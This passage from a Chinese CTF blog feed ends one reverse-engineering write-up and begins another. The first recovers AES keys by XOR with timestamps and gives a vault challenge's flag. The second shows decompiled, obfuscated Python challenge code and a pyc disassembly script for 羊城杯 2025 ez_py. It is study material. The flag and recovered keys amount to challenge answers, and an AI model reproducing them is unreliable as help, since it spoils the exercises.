class="number">0x5e</span>, <span class="number">0x86</span>, <span class="number">0x72</span>, <span class="number">0x75</span>, <span class="number">0xa9</span>, <span class="number">0xb7</span>, <span class="number">0xbf</span>, <span class="number">0x80</span>, <span class="number">0x52</span>, <span class="number">0xd0</span>, <span class="number">0x06</span>, <span class="number">0xa2</span>,</span><br><span class="line">                     <span class="number">0xc9</span>, <span class="number">0x62</span>, <span class="number">0xdd</span>, <span class="number">0x9c</span>, <span class="number">0xf2</span>, <span class="number">0xee</span>, <span class="number">0x60</span>, <span class="number">0x5e</span>, <span class="number">0xa0</span>, <span class="number">0x6b</span>, <span class="number">0x4c</span>, <span class="number">0xcf</span>, <span class="number">0xb5</span>, <span class="number">0xef</span>, <span class="number">0x0d</span>, <span class="number">0x82</span>]</span><br><span class="line">    CreateTime_8080 = <span class="number">0x01dc3fe6ed454439</span></span><br><span class="line"></span><br><span class="line">    EncKeyIV_1080 = [<span class="number">0x20</span>, <span class="number">0x51</span>, <span class="number">0xb5</span>, <span class="number">0x07</span>, <span class="number">0x07</span>, <span class="number">0x70</span>, <span class="number">0xb8</span>, <span class="number">0x0e</span>, <span class="number">0xfc</span>, <span class="number">0xa3</span>, <span class="number">0x9c</span>, <span class="number">0x30</span>, <span class="number">0x54</span>, <span class="number">0x92</span>, <span class="number">0xd6</span>, <span class="number">0x44</span>,</span><br><span class="line">                     <span class="number">0x9d</span>, <span class="number">0x08</span>, <span class="number">0xe2</span>, <span class="number">0x02</span>, <span class="number">0xfe</span>, <span class="number">0x81</span>, <span class="number">0xd1</span>, <span class="number">0xf6</span>, <span class="number">0x70</span>, <span class="number">0xb6</span>, <span class="number">0x86</span>, <span class="number">0x35</span>, <span class="number">0x20</span>, <span class="number">0xb4</span>, <span class="number">0xa6</span>, <span class="number">0x6e</span>,</span><br><span class="line">                     <span class="number">0xaf</span>, <span class="number">0x40</span>, <span class="number">0xdf</span>, <span class="number">0x21</span>, <span class="number">0xda</span>, <span class="number">0x73</span>, <span class="number">0x21</span>, <span class="number">0x01</span>, <span class="number">0x3a</span>, <span class="number">0xfa</span>, <span class="number">0x99</span>, <span class="number">0x1c</span>, <span class="number">0xe6</span>, <span class="number">0x56</span>, <span class="number">0x69</span>, <span class="number">0x00</span>]</span><br><span class="line">    CreateTime_1080 = <span class="number">0x01dc3fe6f02a77eb</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对8080数据进行异或解密</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">48</span>, <span class="number">8</span>):</span><br><span class="line">        <span class="comment"># 将8个字节转换为64位整数</span></span><br><span class="line">        current_value = struct.unpack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="built_in">bytes</span>(EncKeyIV_1080[i:i+<span class="number">8</span>]))[<span class="number">0</span>]</span><br><span class="line">        <span class="comment"># 异或操作</span></span><br><span class="line">        xored_value = current_value ^ CreateTime_1080</span><br><span class="line">        <span class="comment"># 将结果转换回字节并替换原数据</span></span><br><span class="line">        xored_bytes = struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, xored_value)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            EncKeyIV_1080[i + j] = xored_bytes[j]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对1080数据进行异或解密</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">48</span>, <span class="number">8</span>):</span><br><span class="line">        <span class="comment"># 将8个字节转换为64位整数</span></span><br><span class="line">        current_value = struct.unpack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="built_in">bytes</span>(EncKeyIV_8080[i:i+<span class="number">8</span>]))[<span class="number">0</span>]</span><br><span class="line">        <span class="comment"># 异或操作</span></span><br><span class="line">        xored_value = current_value ^ CreateTime_8080</span><br><span class="line">        <span class="comment"># 将结果转换回字节并替换原数据</span></span><br><span class="line">        xored_bytes = struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, xored_value)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            EncKeyIV_8080[i + j] = xored_bytes[j]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;AES Key_1(8080): &quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;EncKeyIV_1080[i]:02X&#125;</span> &quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;AES IV_1(8080): &quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">48</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;EncKeyIV_1080[i]:02X&#125;</span> &quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;AES Key_2(1080): &quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;EncKeyIV_8080[i]:02X&#125;</span> &quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;AES IV_2(1080): &quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">48</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;EncKeyIV_8080[i]:02X&#125;</span> &quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AES Key_1(8080): 7C 35 D9 7B 15 2E 5C 2F A4 E8 B7 79 82 71 1B E4 6B E0 03 D8 B8 B9 AE 74 90 F3 FA 6D B4 EF DA A3 </span><br><span class="line">AES IV_1(8080): F0 26 98 71 14 D1 BC 5F 99 2F 09 22 53 D0 D1 83 </span><br><span class="line">AES Key_2(1080): CB 26 9F F7 E1 4F 64 0F 17 D4 B6 C0 B2 AD 0A 45 76 7F C8 F2 18 BE 0D F7 9B C1 AC C5 C6 8B 7A 6F </span><br><span class="line">AES IV_2(1080): 44 37 F5 D1 3C 4C FD 00 D1 8D B3 EC 00 69 B5 01 </span><br></pre></td></tr></table></figure><p>密文1解出来一句话</p><p><img src="/2025/10/27/Secured-Personal-Vault%E5%A4%8D%E7%8E%B0/image-20251028163945644.png" alt="image-20251028163945644"></p><p>密文2</p><p><img src="/2025/10/27/Secured-Personal-Vault%E5%A4%8D%E7%8E%B0/image-20251028164812895.png" alt="image-20251028164812895"></p><p>flag{Making_challenge_is_hard_manage_a_secure_vault_is_more_difficult} 得到flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>关于python逆向</title>
      <link href="/2025/10/22/%E5%85%B3%E4%BA%8Epython%E9%80%86%E5%90%91/"/>
      <url>/2025/10/22/%E5%85%B3%E4%BA%8Epython%E9%80%86%E5%90%91/</url>
      
        <content type="html"><![CDATA[<p>之前入门过python逆向，在比赛中发现这两个工具并不能反编译所有的pyinstaller打包的exe,特别是3.12之后的版本</p><h1 id="关于ycb的两道py逆向"><a href="#关于ycb的两道py逆向" class="headerlink" title="关于ycb的两道py逆向"></a>关于ycb的两道py逆向</h1><p><a href="https://www.huoya.work/bk/index.php/archives/548/">2025羊城杯初赛re 完整wp - 霍雅的博客</a></p><h2 id="ez-py"><a href="#ez-py" class="headerlink" title="ez_py"></a>ez_py</h2><p>其中一个附件是key.exe,用pyinstrator解包得到key.pyc</p><p><img src="/2025/10/22/%E5%85%B3%E4%BA%8Epython%E9%80%86%E5%90%91/image-20251022113757708.png" alt="image-20251022113757708"></p><p>python3.13反编译不完整</p><p><a href="https://www.52pojie.cn/thread-2025482-1-1.html">https://www.52pojie.cn/thread-2025482-1-1.html</a></p><p>Pylingual网站反编译的代码</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Decompiled with PyLingual (https://pylingual.io)</span></span><br><span class="line"><span class="comment"># Internal filename: key.py</span></span><br><span class="line"><span class="comment"># Bytecode version: 3.13.0rc3 (3571)</span></span><br><span class="line"><span class="comment"># Source timestamp: 1970-01-01 00:00:00 UTC (0)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">import</span> types</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">o0o0o0 = [<span class="number">105084753</span>, <span class="number">3212558540</span>, <span class="number">351342182</span>, <span class="number">844102737</span>, <span class="number">2002504052</span>, <span class="number">356536456</span>, <span class="number">2463183122</span>, <span class="number">615034880</span>, <span class="number">1156203296</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">changli</span>(<span class="params">o0o0o1, o0o0o2, o0o0o3</span>):</span><br><span class="line">    o0o0o4 = <span class="number">2269471011</span></span><br><span class="line">    o0o0o5 = o0o0o3 &amp; <span class="number">4294967295</span></span><br><span class="line">    o0o0o6 = (o0o0o3 &gt;&gt; <span class="number">8</span> ^ <span class="number">305419896</span>) &amp; <span class="number">4294967295</span></span><br><span class="line">    o0o0o7 = (o0o0o3 &lt;&lt; <span class="number">4</span> ^ <span class="number">2271560481</span>) &amp; <span class="number">4294967295</span></span><br><span class="line">    o0o0o8 = (o0o0o3 &gt;&gt; <span class="number">12</span> ^ <span class="number">2882400000</span>) &amp; <span class="number">4294967295</span></span><br><span class="line">    o0o0o9 = o0o0o1 &amp; <span class="number">4294967295</span></span><br><span class="line">    o0o0o10 = o0o0o2 &amp; <span class="number">4294967295</span></span><br><span class="line">    o0o0o11 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        o0o0o11 = o0o0o11 + o0o0o4 &amp; <span class="number">4294967295</span></span><br><span class="line">        o0o0o9 = o0o0o9 + ((o0o0o10 &lt;&lt; <span class="number">4</span>) + o0o0o5 ^ o0o0o10 + o0o0o11 ^ (o0o0o10 &gt;&gt; <span class="number">4</span>) + o0o0o6) &amp; <span class="number">4294967295</span></span><br><span class="line">        o0o0o10 = o0o0o10 + ((o0o0o9 &lt;&lt; <span class="number">4</span>) + o0o0o7 ^ o0o0o9 + o0o0o11 ^ (o0o0o9 &gt;&gt; <span class="number">4</span>) + o0o0o8) &amp; <span class="number">4294967295</span></span><br><span class="line">    <span class="keyword">return</span> (o0o0o9, o0o0o10)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Shorekeeper</span>(<span class="params">o0o0o12</span>):</span><br><span class="line">    o0o0o13 = o0o0o12 &gt;&gt; <span class="number">16</span></span><br><span class="line">    o0o0o14 = o0o0o12 &amp; <span class="number">65535</span></span><br><span class="line">    <span class="keyword">return</span> (o0o0o13, o0o0o14)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Kathysia</span>(<span class="params">o0o0o15, o0o0o16</span>):</span><br><span class="line">    <span class="keyword">return</span> o0o0o15 &lt;&lt; <span class="number">16</span> | o0o0o16 + <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Phrolova</span>(<span class="params">o0o0o17</span>):</span><br><span class="line">    o0oA = <span class="string">&#x27;Carlotta&#x27;</span></span><br><span class="line">    o0oB = [<span class="string">&#x27;o0oC&#x27;</span>, <span class="string">&#x27;o0oD&#x27;</span>, <span class="string">&#x27;o0oE&#x27;</span>, <span class="string">&#x27;o0oF&#x27;</span>]</span><br><span class="line">    o0oG = []</span><br><span class="line">    o0oG.append(ast.Assign(targets=[ast.Name(<span class="built_in">id</span>=<span class="string">&#x27;o0oH&#x27;</span>, ctx=ast.Store())], value=ast.Constant(<span class="number">305419896</span>)))</span><br><span class="line">    o0oG.append(ast.Assign(targets=[ast.Name(<span class="built_in">id</span>=<span class="string">&#x27;o0oI&#x27;</span>, ctx=ast.Store())], value=ast.BinOp(ast.Name(<span class="built_in">id</span>=<span class="string">&#x27;o0oE&#x27;</span>, ctx=ast.Load()), ast.BitAnd(), ast.Constant(<span class="number">65535</span>))))</span><br><span class="line">    o0oG.append(ast.Assign(targets=[ast.Name(<span class="built_in">id</span>=<span class="string">&#x27;o0oJ&#x27;</span>, ctx=ast.Store())], value=ast.BinOp(ast.BinOp(ast.Name(<span class="built_in">id</span>=<span class="string">&#x27;o0oE&#x27;</span>, ctx=ast.Load()), ast.RShift(), ast.Constant(<span class="number">16</span>)), ast.BitAnd(), ast.Constant(<span class="number">65535</span>))))</span><br><span class="line">    o0oG.append(ast.Assign(targets=[ast.Name(<span class="built_in">id</span>=<span class="string">&#x27;o0oK&#x27;</span>, ctx=ast.Store())], value=ast.BinOp(ast.BinOp(ast.Name(<span class="built_in">id</span>=<span class="string">&#x27;o0oE&#x27;</span>, ctx=ast.Load()), ast.BitXor(), ast.Name(<span class="built_in">id</span>=<span class="string">&#x27;o0oF&#x27;</span>, ctx=ast.Load())), ast.BitAnd(), ast.Constant(<span class="number">65535</span>))))</span><br><span class="line">    o0oG.append(ast.Assign(targets=[ast.Name(<span class="built_in">id</span>=<span class="string">&#x27;o0oL&#x27;</span>, ctx=ast.Store())], value=ast.BinOp(ast.BinOp(ast.Name(<span class="built_in">id</span>=<span class="string">&#x27;o0oE&#x27;</span>, ctx=ast.Load()), ast.RShift(), ast.Constant(<span class="number">8</span>)), ast.BitXor(), ast.Name(<span class="built_in">id</span>=<span class="string">&#x27;o0oF&#x27;</span>, ctx=ast.Load())), ast.BitAnd(), ast.Constant(<span class="number">65535</span>)))</span><br><span class="line">    o0oG.append(ast.Assign(targets=[ast.Name(<span class="built_in">id</span>=<span class="string">&#x27;o0oM&#x27;</span>, ctx=ast.Store())], value=ast.BinOp(ast.BinOp(ast.Name(<span class="built_in">id</span>=<span class="string">&#x27;o0oH&#x27;</span>, ctx=ast.Load()), ast.Mult(), ast.BinOp(ast.Name(<span class="built_in">id</span>=<span class="string">&#x27;o0oF&#x27;</span>, ctx=ast.Load()), ast.Add(), ast.Constant(<span class="number">1</span>))), ast.BitAnd(), ast.Constant(<span class="number">4294967295</span>))))</span><br><span class="line">    o0oG.append(ast.Assign(targets=[ast.Name(<span class="built_in">id</span>=<span class="string">&#x27;o0oN&#x27;</span>, ctx=ast.Store())], value=ast.BinOp(ast.BinOp(ast.BinOp(ast.Name(<span class="built_in">id</span>=<span class="string">&#x27;o0oD&#x27;</span>, ctx=ast.Load()), ast.LShift(), ast.Constant(<span class="number">5</span>)), ast.Add(), ast.Add(), ast.Constant(<span class="number">5</span>)), ast.Add(), ast.Name(<span class="built_in">id</span>=<span class="string">&#x27;o0oJ&#x27;</span>, ctx=ast.Load()))))</span><br><span class="line">    o0oG.append(ast.Assign(targets=[ast.Name(<span class="built_in">id</span>=<span class="string">&#x27;o0oP&#x27;</span>, ctx=ast.Store())], value=ast.BinOp(ast.BinOp(ast.Name(<span class="built_in">id</span>=<span class="string">&#x27;o0oC&#x27;</span>, ctx=ast.Load()), ast.Add(), ast.Name(<span class="built_in">id</span>=<span class="string">&#x27;o0oN&#x27;</span>, ctx=ast.Load())), ast.BitAnd(), ast.Constant(<span class="number">65535</span>))))</span><br><span class="line">    o0oG.append(ast.Assign(targets=[ast.Name(<span class="built_in">id</span>=<span class="string">&#x27;o0oN&#x27;</span>, ctx=ast.Store())], value=ast.BinOp(ast.BinOp(ast.BinOp(ast.Name(<span class="built_in">id</span>=<span class="string">&#x27;o0oP&#x27;</span>, ctx=ast.Load()), ast.LShift(), ast.Constant(<span class="number">5</span>)), ast.Add(), ast.Add(), ast.Constant(<span class="number">5</span>)), ast.Add(), ast.Name(<span class="built_in">id</span>=<span class="string">&#x27;o0oL&#x27;</span>, ctx=ast.Load()))))</span><br><span class="line">    o0oG.append(ast.Assign(targets=[ast.Name(<span class="built_in">id</span>=<span class="string">&#x27;o0oQ&#x27;</span>, ctx=ast.Store())], value=ast.BinOp(ast.BinOp(ast.Name(<span class="built_in">id</span>=<span class="string">&#x27;o0oD&#x27;</span>, ctx=ast.Load()), ast.Add(), ast.Name(<span class="built_in">id</span>=<span class="string">&#x27;o0oN&#x27;</span>, ctx=ast.Load())), ast.BitAnd(), ast.Constant(<span class="number">65535</span>))))</span><br><span class="line">    o0oG.append(ast.Return(ast.<span class="type">Tuple</span>(elts=[ast.Name(<span class="built_in">id</span>=<span class="string">&#x27;o0oP&#x27;</span>, ctx=ast.Load()), ast.Name(<span class="built_in">id</span>=<span class="string">&#x27;o0oQ&#x27;</span>, ctx=ast.Load())], ctx=ast.Load())))</span><br><span class="line">    o0oU = ast.FunctionDef(name=o0oA, args=ast.arguments(posonlyargs=[], args=[ast.arg(arg=a) <span class="keyword">for</span> a <span class="keyword">in</span> o0oB], kwonlyargs=[], kw_defaults=[], defaults=[]), body=o0oG, decorator_list=[])</span><br><span class="line">    o0oV = ast.parse(<span class="string">&#x27;\ndef _tea_helper_func(a, b, c):\n    magic1 = (a ^ b) &amp; 0xDEADBEEF\n    magic2 = (c &lt;&lt; 3) | (a &gt;&gt; 5)\n    return (magic1 + magic2 - (b &amp; 0xCAFEBABE)) &amp; 0xFFFFFFFF\n\ndef _fake_tea_round(x, y):\n    return ((x * 0x9E3779B9) ^ (y + 0x12345678)) &amp; 0xFFFFFFFF\n\n_tea_magic_delta = 0x9E3779B9 ^ 0x12345678\n_tea_dummy_keys = [0x1111, 0x2222, 0x3333, 0x4444]\n&#x27;</span>).body</span><br><span class="line">    o0oW = ast.Module(body=[o0oU] + o0oV, type_ignores=[])</span><br><span class="line">    ast.fix_missing_locations(o0oW)</span><br><span class="line">    o0oX = <span class="built_in">compile</span>(o0oW, filename=<span class="string">&#x27;&lt;tea_obf_ast&gt;&#x27;</span>, mode=<span class="string">&#x27;exec&#x27;</span>)</span><br><span class="line">    o0oY = &#123;&#125;</span><br><span class="line">    <span class="built_in">exec</span>(o0oX, o0oY)</span><br><span class="line">    <span class="keyword">if</span> o0oA <span class="keyword">in</span> o0oY:</span><br><span class="line">        o0o0o17[o0oA] = o0oY[o0oA]</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">Phrolova(<span class="built_in">globals</span>())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shouan</span>(<span class="params">o0o0o32</span>):</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&#x27;需要输入9个key&#x27;</span>) <span class="keyword">if</span> <span class="built_in">len</span>(o0o0o32)!= <span class="number">9</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jinhsi</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;请输入9个数字:&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        o0o0o46 = <span class="built_in">input</span>().strip()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;,&#x27;</span> <span class="keyword">in</span> o0o0o46:</span><br><span class="line">            o0o0o42 = o0o0o46.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(o0o0o42)!= <span class="number">9</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;错误: 需要输入9个数&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> o0o0o47:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;发生错误: <span class="subst">&#123;o0o0o47&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    jinhsi()</span><br></pre></td></tr></table></figure><p>貌似也不完整</p><p>所以使用 xdis——“跨 Python 反汇编器”生成字节码</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">decompile_pyc_313.py</span></span><br><span class="line"><span class="string">将 Python 3.13 版本的 .pyc 文件反编译为汇编字节码并保存到文本文件中</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">from</span> contextlib <span class="keyword">import</span> redirect_stdout</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_code_object</span>(<span class="params">pyc_path</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    读取 .pyc 文件，返回反序列化后的 code object。</span></span><br><span class="line"><span class="string">    兼容 Python 3.13 的 PYC 文件头格式。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(pyc_path, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        magic = f.read(<span class="number">4</span>)  <span class="comment"># 魔数</span></span><br><span class="line">        bitfield = f.read(<span class="number">4</span>)  <span class="comment"># Bitfield（包含优化模式、hash-based 信息等）</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Python 3.7+ pyc 格式在这里开始存储 hash 或 timestamp</span></span><br><span class="line">        <span class="comment"># 在 3.13 中文件头更复杂，我们尝试跳过 8 或 16 字节</span></span><br><span class="line">        data = f.read()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            code = marshal.loads(data)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="comment"># 尝试跳过 timestamp / hash 部分</span></span><br><span class="line">            data = data[<span class="number">8</span>:]</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                code = marshal.loads(data)</span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                data = data[<span class="number">16</span>:]</span><br><span class="line">                code = marshal.loads(data)</span><br><span class="line">    <span class="keyword">return</span> code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">disassemble_recursive</span>(<span class="params">code, out, indent=<span class="number">0</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    递归反汇编 code 对象及其子对象（函数、闭包、类）。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    indent_str = <span class="string">&quot; &quot;</span> * indent</span><br><span class="line">    out.write(<span class="string">f&quot;<span class="subst">&#123;indent_str&#125;</span>Disassembly of code object: <span class="subst">&#123;code.co_name&#125;</span>\n&quot;</span>)</span><br><span class="line">    out.write(<span class="string">f&quot;<span class="subst">&#123;indent_str&#125;</span><span class="subst">&#123;<span class="string">&#x27;-&#x27;</span> * <span class="number">60</span>&#125;</span>\n&quot;</span>)</span><br><span class="line">    dis.dis(code, file=out)</span><br><span class="line">    out.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 遍历常量，递归反汇编子函数</span></span><br><span class="line">    <span class="keyword">for</span> const <span class="keyword">in</span> code.co_consts:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(const, <span class="built_in">type</span>(code)):</span><br><span class="line">            disassemble_recursive(const, out, indent + <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decompile_pyc</span>(<span class="params">pyc_path, output_path=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    主函数：将 pyc 反汇编并写入文件。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> output_path <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        output_path = pyc_path + <span class="string">&quot;.dis.txt&quot;</span></span><br><span class="line"></span><br><span class="line">    code = load_code_object(pyc_path)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_path, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> out:</span><br><span class="line">        out.write(<span class="string">f&quot;[+] Disassembly of <span class="subst">&#123;pyc_path&#125;</span>\n&quot;</span>)</span><br><span class="line">        out.write(<span class="string">&quot;=&quot;</span> * <span class="number">60</span> + <span class="string">&quot;\n\n&quot;</span>)</span><br><span class="line">        disassemble_recursive(code, out)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] 